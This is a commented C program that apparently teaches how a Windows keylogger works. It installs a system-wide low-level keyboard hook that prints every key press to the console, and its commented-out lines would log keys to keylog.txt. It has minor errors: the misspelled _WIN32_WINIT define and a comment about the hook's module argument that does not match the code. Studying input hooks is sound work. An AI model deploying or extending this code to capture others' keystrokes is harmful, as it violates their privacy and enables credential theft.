
// This tells the compiler we're targeting Windows 2000 or later, for
// compatibility with WH_KEYBOARD_LL
#define _WIN32_WINIT 0x0500
#include <stdio.h>
#include <windows.h>

// HHOOK is a windows event, lets program monitor events in system like keyboard
// input Think of it like a  "subscribing to OS-level events" and HOOK is our
// subscription receipt
HHOOK hHook;

/*
nCode: determines if the message should be processed.

wParam: tells the type of keyboard message (like key down).

lParam: contains a pointer to a KBDLLHOOKSTRUCT with key event info.
*/
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
  // HC_ACTION means that there is a keyboard event we should process.
  // Checks whether the key event is a key press. WM_SYSKEYDOWN is used for keys
  // like ALT.
  if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {

    /*
    Casts the lParam to a pointer to a KBDLLHOOKSTRUCT struct to access details
    about the key event. vkCode is the virtual key code of the key that was
    pressed (e.g., 65 for 'A').
    */
    KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;
    DWORD vkCode = p->vkCode;

    // FILE *log = fopen("keylog.txt", "a+");
    // if (log) {
    //   fprintf(log, "Key: %lu\n", vkCode);
    //  fclose(log);
    //}
    printf("Pressed key %lu\n", vkCode);
  }

  return CallNextHookEx(hHook, nCode, wParam, lParam);
}

int main() {
  MSG msg;

  /*
  Installs a low-level keyboard hook.

WH_KEYBOARD_LL: low-level keyboard hook type.

KeyboardProc: the callback function we defined.

NULL: means the hook procedure is in the same process.

0: thread ID (0 = hook all threads system-wide).
  */
  hHook =
      SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
  if (!hHook) {
    printf("Failed to install hook!\n");
    return -1;
  }

  printf("Keylogger running\n");

  /*
  GetMessage(&msg, NULL, 0, 0): Retrieves the next message from the message
queue.

TranslateMessage(&msg): Processes the message for character translation.

DispatchMessage(&msg): Sends the message to the window procedure or callback
function (KeyboardProc) for further processing.
  */
  while (GetMessage(&msg, NULL, 0, 0)) {
    TranslateMessage(&msg);
    DispatchMessage(&msg);
  }

  UnhookWindowsHookEx(hHook);
  return 0;
}
